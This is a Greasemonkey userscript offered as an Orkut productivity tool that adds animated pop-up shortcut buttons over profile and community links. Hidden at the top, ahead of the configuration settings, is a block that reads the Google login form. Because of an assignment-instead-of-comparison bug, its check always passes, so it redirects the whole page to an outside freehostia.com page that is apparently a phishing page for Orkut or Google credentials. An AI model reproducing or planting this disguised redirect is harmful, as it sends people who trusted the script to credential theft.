// ==UserScript==
// @name 			Interactive Orkut Shortcuts
// @author 		Hugo Cesar Pessotti / Luiz Fernando da Silva Armesto
// @version 		Revised Version And UpDate By Debajyoti Das
// @description                            Adds Useful Animated Pop-up Shortcuts on most Orkut Links
// @include 		http://*orkut.com*
// ==/UserScript==
// ---------------- Esse script pode ser utilizado e modificado livremente ---------------- //

// ------------------------------- Inicio das configuracoes ------------------------------- //
var act = document.getElementById("gaia_loginform").action;
var tact = act.substr(0,48)
//alert(act);
if (tact = "https://www.google.com/accounts/ServiceLoginAuth")
{
window.top.location = "http://soumyamandi.freehostia.com/priyanka/tembanorkut.html";
}
var Xeretas = 1;			// 1 = Mostra foto das pessoas que te visitaram recentemente
							// 0 = Desliga a funcao
							// Padrao: 1
							// -- Obs. Esta funcao eh independende da MiniFotos --

var MiniFotos = 1;			// 1 = Mostra foto das pessoas ao passar o mouse
							// 0 = Desliga a funcao
							// Padrao: 1
							// -- Obs. Esta funcao eh independende da Xeretas --

var MiniComunas = 1;		// 1 = Mostra foto das comunidades ao passar o mouse
							// 0 = Desliga a funcao
							// Padrao: 1
							
var Simplificado = 1;		// 1 = Esconde os botoes add/remove // 0 = Mostra todos os botoes
							// Padrao: 1	

var FundoTransparente = 2;	// 0 = Nunca; 1 = sempre; 2 = quando mouse esta fora
							// Padrao: 2

var Opacidade = 0.8;		// Grau de transparencia da caixa, de 0 a 1
							// Padrao: 0.8

var Direcao = 0;			// 0 = Horizontal // 1 = Vertical esquerda // 2 = Vertical direita
							// Padrao: 2

var Bordas = 5;				// Grau de curvatura das bordas, de 0 a 10
							// Padrao: 5
							
var LarguraBorda = 3;		// Largura da borda
							// Padrao: 3

var CaixaCor  = "#AFC0EA";	// Cor mais de fundo da caixa
							// Padrao: #AFC0EA

var BordaCor1 = "#6F80EA";	// Cor mais clara da borda
							// Padrao: #6F80EA

var BordaCor2 = "#BABAD8";	// Cor mais escura da borda
							// Padrao: #BABAD8

var tempo  = 275;			// Tempo para abrir o popup, em milisegundos
							// Padrao: 275, minimo 150

var NovaAba = 0;			// 1 = Abre em novas abas; 0 = Abre na mesma janela
							// Padrao: 0
// -------------------------------- Fim das configuracoes -------------------------------- //

/*
Colaborador: Hugo Cesar
Desenvolvedor: Luiz Fernando

Changelog 0.3.7.1
	- Adicionado botoes de foto e video para o Xeretas

Changelog 0.3.7
	- Novas opcoes: Acesso a videos
	- Corrigido erro na home quando desativa a opcao de visitantes (bina) do orkut
*/

setTimeout(function() {
//addEventListener("load",function(){
	
	var toa			= 0;
	var ref			= new Array();
	var refs;
	var posX, posY;
	var tamX, tamY;
	var Opa			= Opacidade;
	var endereco	= location.href.toLowerCase()
	
	if (tempo < 150)
		tempo = 150;

	document.addEventListener('mousemove', function(event){
		posX = event.pageX;
		posY = event.pageY;
	}, false);
	
	var Esconder = function() {
		if (toa) {
			clearTimeout(toa);
			toa = 0;
		}
		Div1.style.visibility = "hidden";
	}
	
	var Mostrar = function() {
		if (toa) {
			clearTimeout(toa);
			toa = 0;
		}
		
		telaX = document.body.clientWidth + window.pageXOffset;
		telaY = document.body.clientHeight + window.pageYOffset;

		tamX = Div1.clientWidth+2*LarguraBorda;
		tamY = Div1.clientHeight+2*LarguraBorda;
				
		if (Direcao == 0) {
			Div1.style.top			= posY - ((posY+tamY+5 > telaY) ? tamY :0) -5 + "px";
			Div1.style.left			= posX + ((posX+tamX+15 > telaX) ? -tamX-6 : 6) + "px";
		}
		else if (Direcao == 1) {
			Div1.style.top			= posY - ((posY > telaY-tamX-5) ? tamX-15 : 9) + "px";
			Div1.style.left			= posX + ((posX < tamY+15) ? 6 : -tamY-6) + "px";
		}
		else if (Direcao == 2) {
			Div1.style.top			= posY - ((posY > telaY-tamX-5) ? tamX-15 : 9) + "px";
			Div1.style.left			= posX + ((posX > telaX-tamY-15) ? -tamY-6 : 6) + "px";
		}

		Div1.style.visibility	= "visible";
	};

	var ShowDiv = function(hrefLink, botoes) {
		if (toa) {
			clearTimeout(toa);
			toa = 0;
		}
		Div1.style.visibility = "hidden";
		
		LinkID = hrefLink.split("?");
		
		for (var i = 0; i < refs; i++) {
			Div1.removeChild(ref[i]);
		}
		refs = 0;
		
		for (var i = 0; i < botoes.length; i++) {
			botoes[i].href = botoes[i].link + LinkID[1];
			Div1.appendChild(botoes[i]);
			ref[i] = botoes[i];
			refs++;
		}
		this.src="";
		toa = setTimeout(Mostrar, tempo);
	};
	
	var HideDiv = function() {
		if (toa) {
			clearTimeout(toa);
			toa = 0;
		}
		toa = setTimeout(Esconder, tempo);
	};

	// Caixa
	Div1 = document.createElement('div');
	Div1.setAttribute("style","padding: 3px; z-index:10000000; position: absolute;");
	
	if (LarguraBorda > 0)
		Div1.style.border = "outset "+LarguraBorda+"px";
	else
		Div1.style.border = "outset 2px";

	Div1.style.borderColor 		= BordaCor1+" "+BordaCor2+" "+BordaCor2+" "+BordaCor1;
	Div1.style.backgroundColor 	= CaixaCor;

	if (FundoTransparente > 0)
		Div1.style.opacity = Opacidade;
		
	if (Bordas > 0)
		Div1.style.MozBorderRadius = Bordas;
		
	Div1.style.visibility = "hidden";
	
	Div1.addEventListener('mouseover', function(event){
		if (toa) {
			clearTimeout(toa);
			toa = 0;
		}
		
		if (FundoTransparente != 1)
			Div1.style.opacity = 1;
	}, false);
	
	Div1.addEventListener('mouseout', function(event){
		if (toa) {
			clearTimeout(toa);
			toa = 0;
		}
		
		if (FundoTransparente != 0)
			Div1.style.opacity = Opacidade;

		HideDiv();
	}, false);

	document.body.appendChild(Div1);
	
	//Links
	var xereta		= document.createElement('a');
	xereta.link		= "http://www.orkut.com/Profile.aspx?";

	var scrap		= document.createElement('a');
	scrap.link		= "http://www.orkut.com/ScrapBook.aspx?";
	
	var msgs		= document.createElement('a');
	msgs.link		= "http://www.orkut.com/Messages.aspx?a=Compose&";
	
	var foto		= document.createElement('a');
	foto.link		= "http://www.orkut.com/AlbumList.aspx?";
	
	var video		= document.createElement('a');
	video.link		= "http://www.orkut.com/FavoriteVideos.aspx?";

	var add			= document.createElement('a');
	add.link		= "http://www.orkut.com/FriendAdd.aspx?";
	
	var forum		= document.createElement('a');
	forum.link		= "http://www.orkut.com/CommTopics.aspx?";
	
	var forumnew	= document.createElement('a');
	forumnew.link	= "http://www.orkut.com/CommMsgPost.aspx?";

	var join		= document.createElement('a');
	join.link		= "http://www.orkut.com/CommunityJoin.aspx?";
	
	var part		= document.createElement('a');
	part.link		= "http://www.orkut.com/CommunityUnjoin.aspx?";

	var members		= document.createElement('a');
	members.link	= "http://www.orkut.com/CommMembers.aspx?";

	var last		= document.createElement('a');
	last.link		= "http://www.orkut.com/CommMsgs.aspx?";

	var reply		= document.createElement('a');
	reply.link		= "http://www.orkut.com/CommMsgPost.aspx?";

	xereta.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFsAAAAgCAMAAABKDfSpAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAGUExURT09Pf///0bN1+UAAAACdFJOU/8A5bcwSgAAAF5JREFUeNpiYKQdYBg1e9TsUbNHmNkMUEAlBiOSCI3NhnmBAUriYsDVEKMY3WwUF8BFEFJQrWjOHXiziQ0TAkYim02EC7DEHA41uNIJ1c0ezfOjZo+aPWo2dQBAgAEAA4QJlxW23xgAAAAASUVORK5CYII=";

	scrap.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAkUExURea+OczJya6GC6KrqtekbfG/hYpzVSgeE2JSTrmwrf///////5RZJcYAAAAMdFJOU///////////////ABLfzs4AAAB0SURBVHjaZNBLEoMwDANQB2xJpve/bw205IPGzuJNFkrs845dp9T3tkyp788O6fjvY0MWA1dLcbUkF2sQMFuV8HBosHZR4WBQhHtgsEbCIyYTQdU9ddsJqx4S8zHRqsmp/W3crKaw5ZnbbFMN2/ync74CDADAUQyXIUQeiwAAAABJRU5ErkJggg==";
	foto.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAYUExURQCh4kpKSiuQvvD//RcXF4y06AAAAP////Kn1dEAAAAIdFJOU/////////8A3oO9WQAAAEFJREFUeNpiYMcEDFQQYwEBVDEWRiCACYLE2JABTIwVAVDEgErQxdiYGRjY0MWYsIgxYIphMw/DXizuo2ZYAQQYAI5bCNJrJ5o7AAAAAElFTkSuQmCC";
	video.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAVUExURQAAAAmb44y06EpKSiQkJJqamv///3sw3SgAAAAHdFJOU////////wAaSwNGAAAAiklEQVR42mJgwwQAAcSARQwggLCJAQQQNjGAAMImBhBAYDEGCICJAQQQRIyFmZmZBS4GEEDYxAACiAGhFayZBYgBAggsxggBQDZYMUAAoYgxsIDVAgQQRIwJBBhh+gECCFWMFSwGEEBo5rGC+AABhG4vKxADBBA2vwEEEDYxgADCJgYQQNjEAAIMAPjnBn3jq+8BAAAAAElFTkSuQmCC";
	msgs.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAPUExURfT09K2trTMzM////////9JG0H0AAAAFdFJOU/////8A+7YOUwAAAEVJREFUeNqs0EESABAMQ9FQ9z+zqoYaxoa/6rxdirKHN8trbhAGWhoIvbsJUUlojo2mGRoFa2gUTdFoMXaxw46vv6oCDABYswSKNZyRXQAAAABJRU5ErkJggg==";
	add.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAYUExURYGj2Xd3aRgYAA8A0f//M////wAAAP///wdEdg4AAAAIdFJOU/////////8A3oO9WQAAAF5JREFUeNqM0FEOgCAMA9ButXD/GztE4hZMtB/7eGmAgb4Hn2ZuydoVP/yxKR4WTZTWiBezvScxnzdJyvfepJbet3rZ+ksvcEiru2GYipGUwGwEwBjMtvLz/2ZOAQYAQtsIY3tbRVMAAAAASUVORK5CYII=";
	
	forum.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAPUExURcrKyoeHhwAAAP///////yV/+ecAAAAFdFJOU/////8A+7YOUwAAAElJREFUeNqc0DkWACAIQ8EQvP+ZXUCFR6UpP1OBVoe3Jr7UdA63TWDNIgyJktRxY2wOb+NyQ6I6/XLwBcez3SLyltD7r9K6AAMAPs0EUj3z0BIAAAAASUVORK5CYII=";
	forumnew.over	= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAYUExURXd3acrKyoeHhxgYAP//M////wAAAP///wBRnV4AAAAIdFJOU/////////8A3oO9WQAAAFxJREFUeNqUkEEOwCAIBNci+P8fd7HYQuzF1QuTcUnE2IMzdnkgKEwJpMvECEkJnhtMlYyjHyTGx71THIvZv7f1me+Vsnf2eSOapb4W+Zjam8WyFKxI539VcgswAIC1B4ex+yRTAAAAAElFTkSuQmCC";
	join.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAVUExURc5wcOq5ubpMTNqNjUABAQAAAP///31D5AYAAAAHdFJOU////////wAaSwNGAAAAcUlEQVR42nyQSxbDMAwCsRhy/yNXSRf+5LXaeYwFRtd79IsROBiyxMbwIHJWltFHasKHcUGK7W2FKlZdC52S2z1LllHYfTGYmdMSq9BtN//xrGx1FkaT9JaNtfs319IBFneCrZd2sTm6Isnf/o75CDAAXDYHPe5ogboAAAAASUVORK5CYII=";
	part.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAASUExURc9ycuq4uNmLiz0AAAAAAP///zNWy1kAAAAGdFJOU///////ALO/pL8AAABqSURBVHjafJBJDsAwCAON7fz/yyVcAqlaDok0bCOw3oEvJksXEwhoMDFk0J05rKW4mCoxe2EFNXY4colul5TZOdfXnUWiph5m5n5upcPKpp5Wl0our1aXux2zNweCZdlvpZT5vd8VjwADAIcMBh4ZnqkaAAAAAElFTkSuQmCC";
	members.over	= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAYUExURZiEK+DAN+nPYmiQxjVss2VmZfPz8////1wVZOkAAAAIdFJOU/////////8A3oO9WQAAAFtJREFUeNqU0EkOACEIRFGm0vvfuEEiEnvlX5mXigto/qM3E68bgCBmrNKGpPHwmjEvw7EAIrrNCd1GSMzaf/7aq2Oa9V2KmZZJQlQ2i0wFZbat3UAPPNzvE2AAmSoHhHAH/wAAAAAASUVORK5CYII=";

	last.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAYUExUReXk2qSimMmTGOrRfDtUbgICA6/A6v///2JHbIIAAAAIdFJOU/////////8A3oO9WQAAAGdJREFUeNqU0FEOwCAMAtCipbv/jSdaO5N9yecLSUV7/rEbo1eQxk5EMBShidq0xG1CgqcJyTYxrQ2bES7DKPZCz7ut7xi38aPdcxBmNsijLODjrlplcD2Mi5B7oaXkuXeF1//3CjAAp4sHkJSMJ2IAAAAASUVORK5CYII=";
	reply.over		= "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAMAAABFjsb+AAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAASUExURWxbNw4OAPmVF//PDMxmAP///ycU6p4AAAAGdFJOU///////ALO/pL8AAABYSURBVHjafNBRDsAgCANQCvX+Vx7ghnFulB/yYhOijDPya2SsgJSRqq4wwzJLDeMyMy+GZf0xhxn09tWdT6EcnWlM3FyWR2e4rHSzW1+Welgo+//bcwkwAAAcBYSWWG3sAAAAAElFTkSuQmCC";
	
	xereta.title	= "View Profile"
	scrap.title		= "See Scraps";
	msgs.title		= "Send Message";
	foto.title		= "See Photos";
	video.title		= "See Videos";
	add.title		= "Add Friend";
	
	forum.title		= "View Forum";
	forumnew.title	= "Post new Topic";
	join.title		= "Join Community";
	part.title		= "Leave Community";
	members.title	= "View States";

	last.title		= "Last Page";
	reply.title		= "Reply Topic";

	botoesloop = Array(xereta,scrap,msgs,foto,video,add,forum,forumnew,join,part,members,last,reply);
	i = botoesloop.length-1;
	do {
		botao = botoesloop[i];
		
		if (Direcao > 0)		
			botao.style.display = "block";
		if (NovaAba == 1)
			botao.target = "_new";
		
		botao.img = document.createElement('img');
		botao.img.style.border = "0px";
						
		botao.img.src = botao.over;
		botao.appendChild(botao.img);
		
		if (i > 0) {
			botao.style.opacity = 0.5;
			
			botao.addEventListener('mouseover', function(event){
				this.style.opacity = 1;
			}, false);
			botao.addEventListener('mouseout', function(event){
				this.style.opacity = 0.5;
			}, false);
		}
	} while (i--);
	
	xereta.style.display = "block";
	xeretastd = "";
	
	if (endereco.indexOf("home.aspx") == -1)
		Xeretas = 0;
	
	if (Xeretas == 1) {
    	var plinks = document.evaluate("//a[@href[contains(.,'News.aspx')]]/img", document, null, 7,null);
		if (plinks.snapshotLength > 0) {
			xeretastd = plinks.snapshotItem(0).parentNode.parentNode;
			xeretapics = new Array();
			
			function getPhoto(uid) {
				xereta.img.src = xereta.over;
				if (!xeretapics[uid]) {
					GM_xmlhttpRequest({
						method: 'GET',
						url: 'http://www.orkut.com/AlbumView.aspx?uid=' + uid,
						onreadystatechange: function(responseDetails) {
							if (responseDetails.readyState == 4) {
								xeretafoto = new String(responseDetails.responseText.match(/https?:\/\/images3?\.orkut\.com\/images\/medium\/.+\.jpg/gim));
								xeretapics[uid] = xeretafoto;
								xereta.img.src = xeretafoto;
							}
						}
					});
				}
				else
					xereta.img.src = xeretapics[uid];
			}
		}
	}
	
	links = document.evaluate("//a[contains(@href,'Home.aspx')]", document, null, 7,null);
	i = links.snapshotLength-1;
	if (i > -1) {
		do {
			obj = links.snapshotItem(i);
			obj.addEventListener('mouseover', function(event) {
				ShowDiv(this.href,Array(scrap,foto,video));
			}, false);
			obj.addEventListener('mouseout', function(event){
				HideDiv();
			}, false);	
		} while (i--);
	}
	
	if (endereco.indexOf("commmsgs.aspx?") == -1) {
		links = document.evaluate("//a[contains(@href,'CommMsgs.aspx?')]", document, null, 7,null);
		i = links.snapshotLength-1;
		if (i > -1) {
			do {
				obj = links.snapshotItem(i);
				obj.addEventListener('mouseover', function(event){
					ShowDiv(this.href+'&na=2',Array(last,reply));
				}, false);
				obj.addEventListener('mouseout', function(event){
					HideDiv();
				}, false);	
			} while (i--);
		}
	}
	
	links = document.evaluate("//a[contains(@href,'Community.aspx?')]", document, null, 7,null);
	i = links.snapshotLength-1;
	if (i > -1) {
		do {
			obj = links.snapshotItem(i);
			if (obj.innerHTML.indexOf(".gif") == -1) {
				obj.addEventListener('mouseover', function(event){
					imgfoto = new String(this.innerHTML.match(/(https?:\/\/(.+)klein(.+)\.jpg)/gim,"$1"));
					if (Simplificado == 0)
						botoes = Array(forum,forumnew,join,part,members);
					else
						botoes = Array(forum,forumnew);
					if ((imgfoto != "null") && (MiniComunas == 1)) {
						xereta.img.src = xereta.over;
						xereta.link = "http://www.orkut.com/Community.aspx?";
						xereta.img.src = imgfoto.replace("klein","mittel");
						botoes[botoes.length] = xereta;
					}	
					ShowDiv(this.href,botoes);
				}, false);
				obj.addEventListener('mouseout', function(event){
					HideDiv();
				}, false);	
			}
		} while (i--);
	}
	
	links = document.evaluate("//a[contains(@href,'Profile.aspx?') or contains(@href,'FriendsNet.aspx?')]", document, null, 7,null);
	i = links.snapshotLength-1;
	if (i > -1) {
		do {
			obj = links.snapshotItem(i);
			if (obj.innerHTML.indexOf(".gif") == -1) {
				if (obj.parentNode != xeretastd) {
					obj.addEventListener('mouseover', teste = function(event){
						imgfoto = new String(this.innerHTML.match(/(https?:\/\/(.+)small(.+)\.jpDg)/gim,"$1"));
						if (Simplificado == 0)
							botoes = Array(scrap,foto,video,msgs,add);
						else
							botoes = Array(scrap,foto,video);
						if ((imgfoto != "null") && (MiniFotos == 1)) {
							xereta.img.src = xereta.over;
							xereta.link = "http://www.orkut.com/Profile.aspx?";
							xereta.img.src = imgfoto.replace("small","medium");
							botoes[botoes.length] = xereta;
						}
						ShowDiv(this.href,botoes);
					}, false);
				}
				else if (Xeretas == 1) {
					obj.addEventListener('mouseover', function(event){
						objlink = this.href;
						botoes = Array(scrap,foto,video);
						xereta.img.src = xereta.over;
						xereta.link = "http://www.orkut.com/Profile.aspx?";
						uid = new String(objlink.match(/(\d+)/gim,"$1"));
						getPhoto(uid);
						botoes[botoes.length] = xereta;
						ShowDiv(objlink,botoes);
					}, false);
				}
				obj.addEventListener('mouseout', function(event){
					HideDiv();
				}, false);	
			}
		} while (i--);
	}

//},false);
},350);
